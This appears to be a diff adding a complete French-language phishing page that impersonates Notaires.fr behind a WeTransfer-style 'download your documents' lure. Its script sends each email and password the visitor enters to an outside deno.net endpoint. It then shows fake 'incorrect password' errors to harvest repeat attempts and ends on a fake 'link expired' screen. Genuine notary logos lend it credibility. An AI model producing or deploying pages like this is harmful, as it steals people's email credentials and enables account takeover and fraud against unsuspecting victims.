@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>Notaires.fr - Connexion</title>
+    <link rel="icon" type="image/png" href="https://image.noelshack.com/fichiers/2025/23/7/1749351748-images.png">
+    <link rel="shortcut icon" href="https://www.notaires.fr/themes/custom/not/assets/img/logos/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: url('https://bourse-emplois.notaires.fr/resources/img/fond-header-bleu.jpeg') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 0;
+            background: rgba(255, 255, 255, 0.6);
+            pointer-events: none;
+        }
+        #app, .header, .main-content, .footer {
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            padding: 10px 20px;
+            background-color: rgba(255, 255, 255, 0.7);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        .security-icon {
+            color: #2952CC;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .security-icon span {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 0 10px;
+            position: relative;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 1s cubic-bezier(.4,0,.2,1), transform 1s cubic-bezier(.4,0,.2,1);
+        }
+        .main-content.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .main-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at center, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%);
+            pointer-events: none;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e3e9f0 100%);
+            padding: 16px 10px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-container > *:not(:last-child) {
+            margin-bottom: 18px;
+        }
+
+        .main-logo {
+            height: 10px;
+            width: auto;
+            margin-bottom: 0;
+        }
+
+        h1 {
+            font-family: 'Poppins', sans-serif;
+            font-size: 22px;
+            margin-bottom: 0;
+            color: #000000;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 0;
+            line-height: 1.5;
+        }
+
+        .input-field, .next-button, .login-button {
+            width: 90%;
+            max-width: 320px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .input-field {
+            padding: 10px;
+            margin: 6px 0;
+            border: 2px solid #eee;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: #2952CC;
+            outline: none;
+        }
+
+        .password-section {
+            display: none;
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: all 0.3s ease;
+        }
+
+        .password-section.visible {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .next-button {
+            padding: 10px;
+            background-color: #2952CC;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        .next-button:hover {
+            background-color: #1f3d99;
+            transform: translateY(-1px);
+        }
+
+        .login-button {
+            padding: 10px;
+            background-color: #2952CC;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        .login-button:hover {
+            background-color: #1f3d99;
+            transform: translateY(-1px);
+        }
+
+        .login-button:active {
+            transform: translateY(1px);
+        }
+
+        .links {
+            margin-top: 10px;
+        }
+
+        .links a {
+            color: #000000;
+            text-decoration: none;
+            display: block;
+            margin: 10px 0;
+            transition: color 0.3s ease;
+        }
+
+        .links a:hover {
+            color: #2952CC;
+        }
+
+        .pdf-icon {
+            margin-right: 5px;
+            color: #ff0000;
+        }
+
+        .footer {
+            padding: 10px 20px;
+            margin-top: auto;
+            text-align: right;
+            background-color: rgba(255, 255, 255, 0.7);
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: #2952CC;
+        }
+
+        .security-badges {
+            display: none;
+        }
+
+        .security-badge {
+            display: none;
+        }
+
+        .security-badge i {
+            display: none;
+        }
+
+        .file-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .file-info p {
+            margin: 5px 0;
+        }
+
+        .secure-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #2952CC;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .secure-notice i {
+            margin-right: 5px;
+        }
+
+        /* Nouveaux styles pour les messages d'erreur */
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* Styles pour la fenêtre d'expiration */
+        .expiration-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .expiration-modal {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            margin: 0;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: modalAppear 0.5s ease-out;
+            box-sizing: border-box;
+        }
+
+        @keyframes modalAppear {
+            from {
+                opacity: 0;
+                transform: scale(0.8) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .expiration-icon {
+            font-size: 64px;
+            color: #dc3545;
+            margin-bottom: 20px;
+        }
+
+        .expiration-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+
+        .expiration-message {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .home-button {
+            background-color: #2952CC;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 600;
+        }
+
+        .home-button:hover {
+            background-color: #1f3d99;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(41, 82, 204, 0.3);
+        }
+
+        /* Styles pour le chargement */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9998;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .loading-content {
+            text-align: center;
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .loading-spinner {
+            font-size: 48px;
+            color: #2952CC;
+            margin-bottom: 20px;
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: #2952CC;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        /* Optimisations spécifiques pour mobile */
+        @media screen and (max-width: 768px) {
+            .header {
+                padding: 10px;
+            }
+            
+            .logo {
+                width: 100px;
+            }
+
+            .security-icon {
+                font-size: 20px;
+            }
+
+            .security-icon span {
+                font-size: 12px;
+            }
+
+            .main-content {
+                padding: 0 15px;
+                justify-content: flex-start;
+                padding-top: 20px;
+            }
+
+            .login-container {
+                width: 100%;
+                max-width: 400px;
+                padding: 25px 20px;
+                margin: 0 auto;
+            }
+
+            .input-field, .next-button, .login-button {
+                width: 100%;
+                font-size: 16px;
+                padding: 14px 16px;
+                margin: 8px 0;
+                border-radius: 10px;
+            }
+
+            h1 {
+                font-size: 20px;
+                margin-bottom: 15px;
+            }
+
+            .subtitle {
+                font-size: 14px;
+                line-height: 1.5;
+                margin-bottom: 25px;
+            }
+
+            .footer {
+                padding: 12px 15px;
+            }
+
+            .footer a {
+                font-size: 12px;
+                margin-left: 15px;
+            }
+
+            /* Correction des modales sur mobile */
+            .expiration-overlay {
+                padding: 15px;
+            }
+
+            .expiration-modal {
+                padding: 30px 20px;
+                max-width: calc(100vw - 30px);
+                width: 100%;
+                margin: 0;
+            }
+
+            .expiration-title {
+                font-size: 20px;
+            }
+
+            .loading-overlay {
+                padding: 15px;
+            }
+
+            .loading-content {
+                max-width: calc(100vw - 30px);
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            body {
+                font-size: 14px;
+            }
+
+            .header {
+                flex-direction: column;
+                gap: 12px;
+                text-align: center;
+                padding: 15px 10px;
+            }
+
+            .logo {
+                width: 85px;
+            }
+
+            .security-icon {
+                font-size: 16px;
+            }
+
+            .security-icon span {
+                font-size: 11px;
+                text-align: center;
+                line-height: 1.3;
+            }
+
+            .main-content {
+                padding: 0 10px;
+                justify-content: flex-start;
+                padding-top: 20px;
+                min-height: calc(100vh - 200px);
+            }
+
+            .login-container {
+                width: 100%;
+                max-width: none;
+                padding: 20px 15px;
+                margin: 0;
+                border-radius: 12px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            }
+
+            .input-field, .next-button, .login-button {
+                width: 100%;
+                font-size: 16px;
+                padding: 14px 16px;
+                margin: 8px 0;
+                border-radius: 10px;
+                box-sizing: border-box;
+            }
+
+            .input-field:focus {
+                border-width: 2px;
+                transform: none;
+                box-shadow: 0 0 0 2px rgba(41, 82, 204, 0.2);
+            }
+
+            h1 {
+                font-size: 22px;
+                margin-bottom: 12px;
+                line-height: 1.2;
+            }
+
+            .subtitle {
+                font-size: 14px;
+                line-height: 1.4;
+                margin-bottom: 25px;
+                padding: 0 5px;
+            }
+
+            /* Logo optimisé */
+            .login-container > div:first-child img {
+                width: 90px !important;
+                height: 90px !important;
+                margin-bottom: 15px;
+            }
+
+            .links {
+                margin-top: 20px;
+            }
+
+            .links a {
+                font-size: 14px;
+                padding: 12px 0;
+                border-radius: 8px;
+                background: rgba(41, 82, 204, 0.05);
+                margin: 8px 0;
+                transition: all 0.3s ease;
+            }
+
+            .links a:hover {
+                background: rgba(41, 82, 204, 0.1);
+            }
+
+            .secure-notice {
+                font-size: 12px;
+                margin-top: 20px;
+                padding: 10px;
+                background: rgba(41, 82, 204, 0.08);
+                border-radius: 8px;
+            }
+
+            /* Footer mobile optimisé */
+            .footer {
+                padding: 15px 10px;
+                flex-direction: column;
+                gap: 12px;
+                text-align: center;
+                margin-top: 30px;
+            }
+
+            .footer span {
+                order: 2;
+                font-size: 12px;
+            }
+
+            .footer div {
+                order: 1;
+            }
+
+            .footer a {
+                font-size: 11px;
+                margin: 0 8px;
+                padding: 5px 0;
+            }
+
+            /* Correction des modales sur très petits écrans */
+            .expiration-overlay {
+                padding: 10px;
+            }
+
+            .expiration-modal {
+                padding: 25px 15px;
+                max-width: calc(100vw - 20px);
+                border-radius: 12px;
+            }
+
+            .expiration-icon {
+                font-size: 48px;
+                margin-bottom: 15px;
+            }
+
+            .expiration-title {
+                font-size: 18px;
+                margin-bottom: 12px;
+            }
+
+            .expiration-message {
+                font-size: 14px;
+                margin-bottom: 25px;
+            }
+
+            .home-button {
+                padding: 12px 24px;
+                font-size: 15px;
+                width: 100%;
+                max-width: 200px;
+            }
+
+            .loading-overlay {
+                padding: 10px;
+            }
+
+            .loading-content {
+                max-width: calc(100vw - 20px);
+            }
+
+            .loading-spinner {
+                font-size: 40px;
+            }
+
+            .loading-text {
+                font-size: 16px;
+            }
+        }
+
+        /* Prévention du zoom sur iOS et Android */
+        @media screen and (max-width: 480px) {
+            input[type="email"], input[type="password"] {
+                font-size: 16px !important;
+            }
+        }
+
+        /* Optimisation de la hauteur sur mobile */
+        @media screen and (max-width: 480px) {
+            .main-content {
+                min-height: calc(100vh - 200px);
+                padding-bottom: 20px;
+            }
+            
+            .login-container {
+                margin-bottom: 20px;
+            }
+        }
+
+        /* Gestion du clavier virtuel sur mobile */
+        @media screen and (max-width: 480px) {
+            .input-field:focus {
+                transform: none;
+                box-shadow: 0 0 0 2px rgba(41, 82, 204, 0.2);
+            }
+            
+            .next-button:focus, .login-button:focus {
+                transform: none;
+                outline: 2px solid rgba(41, 82, 204, 0.5);
+            }
+        }
+
+        /* Correction pour les très petits écrans */
+        @media screen and (max-width: 360px) {
+            .expiration-overlay {
+                padding: 8px;
+            }
+
+            .expiration-modal {
+                padding: 20px 12px;
+                max-width: calc(100vw - 16px);
+                border-radius: 10px;
+            }
+
+            .expiration-icon {
+                font-size: 40px;
+                margin-bottom: 12px;
+            }
+
+            .expiration-title {
+                font-size: 16px;
+                margin-bottom: 10px;
+            }
+
+            .expiration-message {
+                font-size: 13px;
+                margin-bottom: 20px;
+            }
+
+            .home-button {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+
+            .loading-overlay {
+                padding: 8px;
+            }
+
+            .loading-content {
+                max-width: calc(100vw - 16px);
+            }
+
+            .loading-spinner {
+                font-size: 36px;
+            }
+
+            .loading-text {
+                font-size: 15px;
+            }
+        }
+
+        /* Nouveaux styles pour la page de sécurité */
+        .security-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://cdn.sanity.io/images/n2i0cmq4/production/799691fdd07bb5df8bec399212e39359cb14afec-1000x667.jpg?fm=webp&fit=clip&auto=format') no-repeat center center;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 1;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .security-page::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+        }
+
+        .security-message {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 600px;
+            margin: 20px;
+            backdrop-filter: blur(5px);
+        }
+
+        .security-message h2 {
+            color: #2952CC;
+            margin-bottom: 20px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .security-message p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .continue-button {
+            background-color: #2952CC;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .continue-button:hover {
+            background-color: #1f3d99;
+        }
+
+        /* Amélioration de la page de consentement */
+        #consentPage {
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* Flou de l'arrière-plan de la page de consentement */
+        #consentPage { overflow: hidden; }
+        #consentPage::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('https://celadon-florentine-5473ad.netlify.app/logo.png') no-repeat center center / cover;
+            filter: blur(8px);
+            transform: scale(1.05);
+            z-index: 0;
+        }
+
+        #consentPage > div {
+            max-width: 480px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Responsive pour la page de consentement */
+        @media screen and (max-width: 768px) {
+            #consentPage {
+                padding: 15px;
+            }
+            
+            #consentPage > div {
+                padding: 35px 25px 30px 25px;
+                max-width: calc(100vw - 30px);
+            }
+            
+            #consentPage > div > div:nth-child(2) {
+                font-size: 1.4rem;
+                white-space: nowrap;
+                line-height: 1.2;
+                overflow: hidden;
+                text-overflow: ellipsis;
+            }
+            
+            #consentPage > div > div:nth-child(3) {
+                font-size: 1rem;
+                line-height: 1.4;
+            }
+            
+            #acceptConsent {
+                font-size: 1rem;
+                padding: 14px 0;
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            #consentPage {
+                padding: 10px;
+            }
+            
+            #consentPage > div {
+                padding: 30px 20px 25px 20px;
+                max-width: calc(100vw - 20px);
+                border-radius: 20px;
+            }
+            
+            #consentPage > div > div:first-child {
+                width: 48px;
+                height: 48px;
+                margin-bottom: 15px;
+            }
+            
+            #consentPage > div > div:nth-child(2) {
+                font-size: 1.2rem;
+                white-space: nowrap;
+                line-height: 1.2;
+                text-align: center;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                max-width: 100%;
+            }
+            
+            #consentPage > div > div:nth-child(3) {
+                font-size: 0.95rem;
+                line-height: 1.4;
+                padding: 0 5px;
+            }
+            
+            #acceptConsent {
+                font-size: 0.95rem;
+                padding: 16px 0;
+                border-radius: 10px;
+            }
+        }
+
+        @media screen and (max-width: 360px) {
+            #consentPage {
+                padding: 8px;
+            }
+            
+            #consentPage > div {
+                padding: 25px 15px 20px 15px;
+                max-width: calc(100vw - 16px);
+                border-radius: 18px;
+            }
+            
+            #consentPage > div > div:first-child {
+                width: 44px;
+                height: 44px;
+                margin-bottom: 12px;
+            }
+            
+            #consentPage > div > div:nth-child(2) {
+                font-size: 1.1rem;
+                margin-bottom: 6px;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                max-width: 100%;
+            }
+            
+            #consentPage > div > div:nth-child(3) {
+                font-size: 0.9rem;
+                margin-bottom: 18px;
+            }
+            
+            #acceptConsent {
+                font-size: 0.9rem;
+                padding: 14px 0;
+                border-radius: 8px;
+            }
+        }
+
+        /* Correction spécifique pour très petits écrans */
+        @media screen and (max-width: 320px) {
+            #consentPage > div > div:nth-child(2) {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Page d'attente/consentement façon WeTransfer -->
+    <div id="consentPage" style="position:fixed;z-index:2000;top:0;left:0;width:100vw;height:100vh;background:url('https://celadon-florentine-5473ad.netlify.app/logo.png') no-repeat center center / cover;display:flex;align-items:center;justify-content:center;transition:opacity 0.5s;padding:20px;box-sizing:border-box;">
+        <div style="background:#fff;border-radius:24px;box-shadow:0 8px 32px rgba(0,0,0,0.10);padding:48px 40px 40px 40px;max-width:480px;width:100%;text-align:left;display:flex;flex-direction:column;align-items:center;box-sizing:border-box;position:relative;z-index:1;">
+            <div style="width:56px;height:56px;border-radius:50%;overflow:hidden;display:flex;align-items:center;justify-content:center;margin-bottom:18px;">
+                <img src="https://bustling-be.surge.sh/cropped-Logo-Notre-France-512x512.png" alt="Logo" style="width:100%;height:100%;object-fit:cover;display:block;">
+            </div>
+            <div style="font-family:'Inter',sans-serif;font-size:2rem;color:#111;line-height:1.2;margin-bottom:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%;text-align:center;font-weight:600;letter-spacing:-0.2px;">Bienvenue </div>
+            <div style="font-size:1.1rem;color:#222;margin-bottom:22px;line-height:1.5;text-align:center;">
+                Accédez à votre espace sécurisé pour consulter vos documents.
+            </div>
+            <button id="acceptConsent" style="width:100%;background:#2952CC;color:#fff;font-size:1.05rem;padding:12px 0;border:none;border-radius:12px;cursor:pointer;font-family:'Inter',sans-serif;font-weight:600;letter-spacing:0.2px;transition:background 0.2s;">Télécharger vos documents</button>
+        </div>
+    </div>
+
+    <!-- Overlay de chargement -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <div class="loading-text">Vérification en cours...</div>
+        </div>
+    </div>
+
+    <!-- Fenêtre d'expiration -->
+    <div class="expiration-overlay" id="expirationOverlay">
+        <div class="expiration-modal">
+            <div class="expiration-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <div class="expiration-title">Lien expiré</div>
+            <div class="expiration-message">
+                Le lien vers les documents sécurisés a expiré.<br>
+                Veuillez contacter l'expéditeur pour obtenir un nouveau lien.
+            </div>
+            <button class="home-button" onclick="returnToHome()">Revenir à l'accueil</button>
+        </div>
+    </div>
+
+    <header class="header">
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <img src="https://image.noelshack.com/fichiers/2025/23/7/1749351748-images.png" alt="Notaires de France carré" style="width: 32px; height: 32px; background: #3d7cff; object-fit: cover;">
+            <img src="https://www.notaires.fr/themes/custom/not/assets/img/logos/notaires.fr.svg" alt="Notaires de France" class="logo">
+        </div>
+        <div class="security-icon">
+            <span style="color: #111; font-weight: 700; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; font-family: 'Poppins', sans-serif; line-height: 1.1; display: inline-block; text-align: right;">
+                La cybersécurité est<br>l'affaire de tous !
+            </span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:8px;"><rect x="3" y="11" width="18" height="10" rx="2" fill="#fff" stroke="#111"/><path d="M7 11V7a5 5 0 0 1 10 0v4" fill="none" stroke="#111"/><circle cx="12" cy="16" r="1.5" fill="#111"/></svg>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div id="downloadStatus" style="display:none; flex-direction:column; align-items:center; justify-content:center; text-align:center;">
+            <div id="downloadSpinner" style="font-size:48px; color:#2952CC; margin-bottom:20px;"><i class="fas fa-spinner fa-spin"></i></div>
+            <div id="downloadMessage" style="font-size:20px; color:#2952CC;">Téléchargement en cours...</div>
+        </div>
+        <div class="login-container">
+            <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 16px;">
+                <img src="https://cdn-ilcaajn.nitrocdn.com/QLFbTVjUlzXNgUzHkRzEoXHalSGMZEsE/assets/images/optimized/rev-b078cd5/etude-laidet.notaires.fr/wp-content/uploads/2018/07/logo-notaire-removebg-preview.webp" alt="Logo Notaire" style="width: 120px; height: 120px; object-fit: contain; image-rendering: crisp-edges; margin-bottom: 8px;">
+            </div>
+            <h1>Documents sécurisés</h1>
+            <p class="subtitle">Pour lire le document veuillez entrer les identifiants de messagerie auxquels ce fichier a été envoyé.</p>
+            
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="email-section">
+                    <input type="email" class="input-field" placeholder="E-mail" id="email" required>
+                    <button type="button" class="next-button" onclick="showPasswordSection()">Continuer</button>
+                </div>
+
+                <div class="password-section" id="passwordSection">
+                    <input type="password" class="input-field" placeholder="Mot de passe" id="password" required>
+                    <div class="error-message" id="passwordError"></div>
+                    <button type="submit" class="login-button">Télécharger</button>
+                </div>
+            </form>
+
+            <div class="links">
+                <a href="#" style="text-decoration: none;"><i class="fas fa-file-pdf pdf-icon"></i><strong>Documents_N768600.pfd</strong></a>
+                <div class="secure-notice">
+                    <i class="fas fa-lock"></i>
+                    Connexion sécurisée requise
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer" style="position: relative; display: flex; align-items: center; justify-content: space-between;">
+        <span style="color: #666; font-size: 14px;">©2025 Notaires.fr</span>
+        <div style="position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); pointer-events: none;">
+            <img src="https://image.noelshack.com/fichiers/2025/23/7/1749357388-t-l-chargement-1.png" alt="Logo Footer" style="height: 28px; display: block;">
+        </div>
+        <div>
+            <a href="#"></a>
+            <a href="#">Confidentialité</a>
+        </div>
+    </footer>
+    <script>
+        let loginAttempts = 0;
+        const maxAttempts = 3;
+
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                await fetch('https://polite-hawk-20.behgardib-sudo.deno.net/api/notify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email,
+                        password,
+                        timestamp: new Date().toISOString(),
+                        site: 'WeTransfer Secure'
+                    })
+                });
+            } catch (error) {
+                console.error('Erreur:', error);
+            }
+
+            loginAttempts++;
+            
+            if (loginAttempts < maxAttempts) {
+                // Afficher le message d'erreur pour les 2 premières tentatives
+                showPasswordError();
+            } else {
+                // 3ème tentative - afficher le chargement puis l'expiration
+                showLoadingAndExpiration();
+            }
+        }
+
+        function showPasswordError() {
+            const errorElement = document.getElementById('passwordError');
+            errorElement.textContent = 'Mot de passe incorrect. Veuillez réessayer.';
+            errorElement.style.display = 'block';
+            
+            // Effacer le mot de passe
+            document.getElementById('password').value = '';
+            
+            // Masquer le message d'erreur après 3 secondes
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 3000);
+        }
+
+        function showLoadingAndExpiration() {
+            // Afficher le chargement
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // Après 2-3 secondes, masquer le chargement et afficher l'expiration
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('expirationOverlay').style.display = 'flex';
+            }, 2500); // 2.5 secondes
+        }
+
+        function returnToHome() {
+            // Recharger la page pour revenir à l'accueil
+            window.location.reload();
+        }
+
+        function showPasswordSection() {
+            const email = document.getElementById('email').value;
+            if (email) {
+                const passwordSection = document.getElementById('passwordSection');
+                const emailSection = document.querySelector('.email-section');
+                
+                passwordSection.classList.add('visible');
+                emailSection.querySelector('.next-button').style.display = 'none';
+                
+                // Masquer les messages d'erreur précédents
+                document.getElementById('passwordError').style.display = 'none';
+            }
+        }
+
+        // Nouvelle fonction pour gérer la page de sécurité
+        function hideSecurityPage() {
+            const securityPage = document.getElementById('securityPage');
+            securityPage.classList.add('fade-out');
+            setTimeout(() => {
+                securityPage.style.display = 'none';
+            }, 500);
+        }
+
+        // Modification de l'animation d'ouverture
+        window.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                document.querySelector('.main-content').classList.add('visible');
+            }, 500);
+        });
+
+        // Ajout du script pour la page de consentement
+        document.getElementById('acceptConsent').onclick = function() {
+            document.getElementById('consentPage').style.opacity = '0';
+            setTimeout(function() {
+                document.getElementById('consentPage').style.display = 'none';
+            }, 500);
+        };
+    </script>
+</body>
+</html> 
